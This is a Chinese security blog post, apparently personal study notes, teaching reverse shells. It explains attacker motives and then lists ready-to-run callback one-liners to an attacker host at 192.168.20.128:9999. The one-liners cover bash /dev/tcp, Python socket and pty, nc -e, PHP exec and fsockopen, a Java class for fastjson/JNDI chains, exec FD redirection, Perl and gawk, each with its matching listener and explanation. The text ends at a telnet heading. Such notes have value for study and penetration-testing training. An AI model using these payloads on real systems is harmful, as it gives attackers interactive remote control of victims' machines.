<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>反弹shell | yyssh's blog</title><meta name="author" content="yyssh"><meta name="copyright" content="yyssh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="反弹shell什么是shellShell 俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。简单说用户通过壳（shell）访问操作系统内核的服务，也就是由壳到内核，执行系统命令。 用户-&gt;外围程序（shell）-&gt;内核-&gt;硬件 什么是反弹shell反弹s">
<meta property="og:type" content="article">
<meta property="og:title" content="反弹shell">
<meta property="og:url" content="https://0xyyssh.github.io/posts/2f610211.html">
<meta property="og:site_name" content="yyssh&#39;s blog">
<meta property="og:description" content="反弹shell什么是shellShell 俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。简单说用户通过壳（shell）访问操作系统内核的服务，也就是由壳到内核，执行系统命令。 用户-&gt;外围程序（shell）-&gt;内核-&gt;硬件 什么是反弹shell反弹s">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://0xyyssh.github.io/coverImages/default_bg9.jpg">
<meta property="article:published_time" content="2026-01-21T10:19:52.000Z">
<meta property="article:modified_time" content="2026-01-21T10:49:19.950Z">
<meta property="article:author" content="yyssh">
<meta property="article:tag" content="web">
<meta property="article:tag" content="笔记">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://0xyyssh.github.io/coverImages/default_bg9.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "反弹shell",
  "url": "https://0xyyssh.github.io/posts/2f610211.html",
  "image": "https://0xyyssh.github.io/coverImages/default_bg9.jpg",
  "datePublished": "2026-01-21T10:19:52.000Z",
  "dateModified": "2026-01-21T10:49:19.950Z",
  "author": [
    {
      "@type": "Person",
      "name": "yyssh",
      "url": "https://0xyyssh.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/images/firewall.png"><link rel="canonical" href="https://0xyyssh.github.io/posts/2f610211.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":280,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '反弹shell',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/layout.css"><link rel="stylesheet" href="/css/index_layout.css"><link rel="stylesheet" href="/css/footer.css"><link rel="stylesheet" href="/css/swiper.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/5.4.5/css/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper-lyx/lib/swiperstyle.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="loading_img"></div></div></div><script>window.paceOptions = {
  restartOnPushState: false
}
</script><link rel="stylesheet" href="/css/loading-bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  //- pace进度条结束后再关闭loading
  Pace.on('done', preloader.endLoading)

  btf.addGlobalFn('pjaxSend', () => {
      Pace.restart()
      if (false){
          preloader.initLoading()
      }
  }, 'pace_restart')
})()</script><div class="bg-animation" id="web_bg" style="background-color: #FCFCF7;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 上朝听政</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 史记存档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-book"></i><span> 翰林书院</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-bookmark"></i><span> 御赐黄签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 诸侯会盟</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/coverImages/default_bg9.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">yyssh's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">反弹shell</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 上朝听政</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 史记存档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-book"></i><span> 翰林书院</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-bookmark"></i><span> 御赐黄签</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 诸侯会盟</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">反弹shell</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-21T10:19:52.000Z" title="发表于 2026-01-21 18:19:52">2026-01-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-21T10:49:19.950Z" title="更新于 2026-01-21 18:49:19">2026-01-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89%E6%8A%80%E6%9C%AF/">网安技术</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="什么是shell"><a href="#什么是shell" class="headerlink" title="什么是shell"></a>什么是shell</h2><p>Shell 俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。简单说用户通过壳（shell）访问操作系统内核的服务，也就是由壳到内核，执行系统命令。</p>
<p>用户-&gt;外围程序（shell）-&gt;内核-&gt;硬件</p>
<h2 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a>什么是反弹shell</h2><p>反弹shell（reverse shell），就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
<h2 id="为什么要反弹shell"><a href="#为什么要反弹shell" class="headerlink" title="为什么要反弹shell"></a>为什么要反弹shell</h2><p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形。</p>
<p>举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。那么什么情况下正向连接不能用了呢？<br>有如下情况：</p>
<ol>
<li><p>某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
</li>
<li><p>目标机器的ip动态改变，你不能持续控制。</p>
</li>
<li><p>由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
</li>
<li><p>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，</p>
</li>
<li><p>webshell下执行命令不交互，为了方便提权或其它操作必须要反弹shell。</p>
</li>
<li><p>反弹shell相当于新增一个后门，当webshell被发现删除后权限不会丢失。</p>
</li>
</ol>
<p>所以建立一个服务端让恶意程序主动连接，才是上策。</p>
<p>那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
<h2 id="确定目标支持的反弹方式"><a href="#确定目标支持的反弹方式" class="headerlink" title="确定目标支持的反弹方式"></a>确定目标支持的反弹方式</h2><p>使用whereis确定目标支持的反弹方式</p>
<p><code>whereis nc bash python php exec lua perl ruby</code></p>
<h2 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h2><p>bash反弹是实战中用的最多的方法</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击者：nc -lvp 9999</span><br><span class="line"></span><br><span class="line">受害者：bash -i &gt;&amp; /dev/tcp/192.168.20.128/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h3 id="命令解释"><a href="#命令解释" class="headerlink" title="命令解释"></a>命令解释</h3><p><code>nc -lvp 9999</code></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc是netcat的简写，可实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口</span><br><span class="line">-l 监听模式，用于入站连接</span><br><span class="line">-v 详细输出--用两个-v可得到更详细的内容</span><br><span class="line">-p port 本地端口号</span><br></pre></td></tr></table></figure>

<p><code>bash -i &gt;&amp; /dev/tcp/192.168.20.128/9999 0&gt;&amp;1</code></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash是命令终端，上面反弹shell的命令是在受害者服务器上执行</span><br><span class="line">-i 是指在本地打开bash命令终端</span><br><span class="line">&gt;&amp;后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程vps</span><br><span class="line">/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接</span><br><span class="line">0&gt;&amp;1 表示把受害者主机上的输入重定向的输出流上，而输出流在攻击者主机上，所以攻击者直接控制输入</span><br><span class="line">远程vps开启对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出</span><br></pre></td></tr></table></figure>

<p>linux文件描述符：linux shell下有三种标准的文件描述符，分别如下：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>文件描述符</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>标准输入 stdin</td>
<td><code>0</code></td>
<td>你键盘输入的内容</td>
</tr>
<tr>
<td>标准输出 stdout</td>
<td><code>1</code></td>
<td>正常输出到屏幕的内容</td>
</tr>
<tr>
<td>标准错误 stderr</td>
<td><code>2</code></td>
<td>错误输出到屏幕的内容</td>
</tr>
</tbody></table>
<p>还有就是&gt;&amp;这个符号的含义，最好的理解是这样的：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当&gt;&amp;后面接文件时，表示将标准输出(1)和标准错误输出(2)重定向至文件。</span><br><span class="line">当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符,这个简单说就是前面跟着后面走，也就是说这个命令：bash -i &gt;&amp; /dev/tcp/192.168.20.128/9999 0&gt;&amp;2 也可以的，因为2也是输出到攻击者主机上</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>重定向格式</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>N&gt;file</code></td>
<td>把 N 号描述符输出重定向到文件</td>
</tr>
<tr>
<td><code>N&gt;&amp;M</code></td>
<td>把 N 号描述符的输出重定向到 M 的目标</td>
</tr>
<tr>
<td><code>N&lt;&amp;M</code></td>
<td>把 N 号描述符的<strong>输入</strong>重定向到 M 的输入源</td>
</tr>
</tbody></table>
<h2 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h2><p>反弹命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击者：nc -lvp 9999</span><br><span class="line"></span><br><span class="line">受害者：python -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.20.128&#x27;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure>

<p>伪终端：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import os,socket,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.20.128&#x27;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#x27;/bin/bash&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="命令解释-1"><a href="#命令解释-1" class="headerlink" title="命令解释"></a>命令解释</h3><p><code>import os,socket,subprocess;</code></p>
<p>导入必要的标准库：</p>
<ul>
<li><code>socket</code>: 用于创建 TCP 连接（本地 ↔ 远程主机）</li>
<li><code>os</code>: 提供系统级操作，如文件描述符操作（这里关键）</li>
<li><code>subprocess</code>: 用于启动新的进程（启动 <code>/bin/bash</code>）</li>
</ul>
<p><code>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</code></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">创建一个 TCP 套接字 s</span><br><span class="line">AF_INET: 表示 IPv4 地址</span><br><span class="line">SOCK_STREAM: 表示使用 TCP 协议</span><br></pre></td></tr></table></figure>

<p>什么是 <code>fileno()</code>？</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">每个打开的文件、socket、管道在内核中都有一个文件描述符（file descriptor），是一个整数编号。</span><br><span class="line">s.fileno() 返回 socket 的文件描述符，比如 3（系统分配）,这里就是远程通道的攻击者主机</span><br></pre></td></tr></table></figure>

<p><code>os.dup2(s.fileno(), X)</code> 的作用</p>
<p>什么是 <code>os.dup2(fd_src, fd_dest)</code>？</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这是一个底层系统调用（C 系统调用 dup2() 的 Python 封装）</span><br><span class="line">它的作用是：把 fd_dest（目标）关闭，然后让它指向 fd_src（源）,这里相当于把0，1，2都指向攻击者主机</span><br><span class="line">就像 fd_dest = fd_src，但更底层、更彻底</span><br></pre></td></tr></table></figure>

<p>这样，所有的输入输出<strong>都通过 socket 来完成</strong>，也就是都发到了攻击者那边。</p>
<h2 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h2><p>使用场景：目标主机安装了netcat</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击者：nc -lnvp 9999</span><br><span class="line"></span><br><span class="line">受害者：nc -e /bin/bash 192.168.20.128 9999</span><br><span class="line">受害者：nc -e /bin/sh 192.168.20.128 9999</span><br></pre></td></tr></table></figure>

<h3 id="命令解释-2"><a href="#命令解释-2" class="headerlink" title="命令解释"></a>命令解释</h3><p><code>nc -lnvp 9999</code></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-n 类似于netstat的-n选项都是不进行DNS解析，nc会对连接主机进行DNS解析，无法解析攻击者主机首行就会警告</span><br></pre></td></tr></table></figure>

<p><code>nc -e /bin/bash 192.168.20.128 9999</code></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-e 用于连接远程服务器，常用于反弹shell 后面接的是程序 ip port</span><br></pre></td></tr></table></figure>

<h2 id="php反弹"><a href="#php反弹" class="headerlink" title="php反弹"></a>php反弹</h2><p>首先最简单的一个办法，就是使用php的exec函数执行系统命令反弹shell<br>（需要php关闭safe_mode选项，才可以使用exec函数）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击者：nc -lnvp 9999</span><br><span class="line"></span><br><span class="line">受害者：php -r <span class="string">&#x27;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.20.128/9999 0&gt;&amp;1&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>一些变形：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击者：nc -nvlp 4986</span><br><span class="line"></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.20.128&quot;,9999);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="命令解释-3"><a href="#命令解释-3" class="headerlink" title="命令解释"></a>命令解释</h3><p><code>php -r &#39;$sock=fsockopen(&quot;192.168.20.128&quot;,9999);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;&amp;3 如果前面没有文件描述符，则默认是0&lt;&amp;3,3如果没有定义，则表示事先打开的某个东西，这里表示socket协议</span><br><span class="line">&gt;&amp;3 如果前面没有文件描述符，则默认是1&gt;&amp;3,那这里就表示标准输出也是重定向到3</span><br><span class="line">所以还是将标准输出、标准输入、错误输出都输出到攻击者主机</span><br></pre></td></tr></table></figure>

<h2 id="java反弹"><a href="#java反弹" class="headerlink" title="java反弹"></a>java反弹</h2><p>主要是java的class文件进行反弹shell，主要与jndi联动的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastJsonNC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">fastJsonNC</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">                <span class="string">&quot;/bin/bash&quot;</span>,</span><br><span class="line">                <span class="string">&quot;-c&quot;</span>,</span><br><span class="line">                <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.20.128/9999 0&gt;&amp;1&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到其实就是bash反弹</p>
<h2 id="exec反弹"><a href="#exec反弹" class="headerlink" title="exec反弹"></a>exec反弹</h2><p>这个和php的exec函数其实是一样的，就是多了一个将FD3绑定到socket协议上了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击者：nc -lnvp 9999</span><br><span class="line"></span><br><span class="line">受害者：<span class="built_in">exec</span> 3&lt;&gt;/dev/tcp/192.168.20.128/9999; /bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3</span><br></pre></td></tr></table></figure>

<h2 id="perl反弹"><a href="#perl反弹" class="headerlink" title="perl反弹"></a>perl反弹</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击者：nc -lnvp 9999</span><br><span class="line"></span><br><span class="line">受害者：perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.20.128&quot;;$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="命令解释-4"><a href="#命令解释-4" class="headerlink" title="命令解释"></a>命令解释</h3><p>这里可以看到其实就是把python的换成perl语言来写，原理是一样的</p>
<p><code>use Socket;</code></p>
<ul>
<li>引入 Perl 的 <code>Socket</code> 模块，提供 socket 编程的函数和常量。</li>
</ul>
<p> <code>socket(S, PF_INET, SOCK_STREAM, getprotobyname(&quot;tcp&quot;));</code></p>
<ul>
<li>创建一个 TCP socket，赋值给文件句柄 <code>S</code></li>
<li>参数解释：<ul>
<li><code>S</code>：这是 Perl 的句柄（socket 名字）</li>
<li><code>PF_INET</code>：协议族（IPv4）</li>
<li><code>SOCK_STREAM</code>：套接字类型（流式套接字，TCP）</li>
<li><code>getprotobyname(&quot;tcp&quot;)</code>：获取 TCP 协议号（通常是 6）</li>
</ul>
</li>
</ul>
<p><code>open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);</code></p>
<ul>
<li>STDIN: 标准输入重定向到socket</li>
<li>STDOUT:标准输出重定向到socket</li>
<li>STDERR:标准错误输出重定向到socket</li>
</ul>
<h2 id="awk反弹"><a href="#awk反弹" class="headerlink" title="awk反弹"></a>awk反弹</h2><p>因为awk的{代码}，这里面可以执行代码，这里要先进行端口监听，再进行反弹shell，不然会报错</p>
<p>本质是通过getline进行命令执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击者：nc -lnvp 9999</span><br><span class="line"></span><br><span class="line">受害者：awk <span class="string">&#x27;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.20.128/9999&quot;;for(;s|&amp;getline c;)while(c|getline)print|&amp;s;close(s)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="代码解释"><a href="#代码解释" class="headerlink" title="代码解释"></a>代码解释</h3><p>使用 <code>awk</code> 的 <code>BEGIN&#123; ... &#125;</code> 块，只在程序开始时执行一次。</p>
<p> <code>s=&quot;/inet/tcp/0/192.168.20.128/9999&quot;</code></p>
<p>这是 gawk（GNU awk）的一种 <strong>特殊语法</strong>：</p>
<ul>
<li>gawk 在支持 <code>two-way open</code> 的时候，允许把 <code>/inet/tcp/...</code> 当成 socket 文件路径。</li>
<li><code>/inet/tcp/0/ip/port</code> 表示：<ul>
<li><strong>协议</strong>：<code>tcp</code></li>
<li><strong>本地端口</strong>：<code>0</code>（随机）</li>
<li><strong>目标 IP</strong>：<code>192.168.20.128</code></li>
<li><strong>目标端口</strong>：<code>9999</code></li>
</ul>
</li>
</ul>
<p> <code>s|&amp;getline c</code></p>
<ul>
<li><code>|&amp;</code> 是 <strong>gawk 的双向管道操作符</strong>，可以同时进行读取和写入。</li>
<li><code>s|&amp;getline c</code> 的意思是：<ul>
<li><strong>从远程读取一行数据</strong>，存入变量 <code>c</code></li>
<li>如果读到内容，继续往下执行</li>
</ul>
</li>
</ul>
<p><code>while(c|getline) print|&amp;s</code></p>
<ul>
<li>这部分逻辑是：<ul>
<li>把远程发送过来的命令存在变量 <code>c</code>（例如 <code>ls</code>）</li>
<li>然后执行它（相当于传入 <code>getline</code>，类似 <code>eval</code>)</li>
<li>把执行结果通过 <code>print|&amp;s</code> 发送回远程。</li>
</ul>
</li>
</ul>
<h2 id="telnet反弹"><a href="#telnet反弹" class="headerlink" title="telnet反弹"></a>telnet反弹</h2><p>需要在攻击主机上分别监听9998和8999端口，执行反弹shell命令后，在9998终端输入命令，8999查看命令执行后的结果</p>
